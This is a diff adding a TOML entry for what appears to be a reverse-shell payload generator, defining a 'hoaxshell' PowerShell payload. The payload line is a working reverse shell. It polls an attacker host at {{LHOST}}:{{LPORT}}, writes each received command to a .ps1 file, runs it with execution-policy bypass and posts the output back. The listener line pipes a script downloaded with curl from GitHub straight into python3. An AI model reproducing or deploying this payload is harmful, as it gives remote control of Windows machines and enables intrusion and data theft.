@@ -1,0 +1,12 @@
+id = "hoaxshell_powershell_outfile"
+name = "PowerShell Outfile"
+os = "windows"
+type = "hoaxshell"
+proto = "http"
+lang = "powershell"
+description = "PowerShell reverse shell using Outfile and HoaxShell HTTP."
+
+payload = "$s='{{LHOST}}:{{LPORT}}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}"
+
+[listeners]
+hoaxshell = "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t http -p {{LPORT}}"
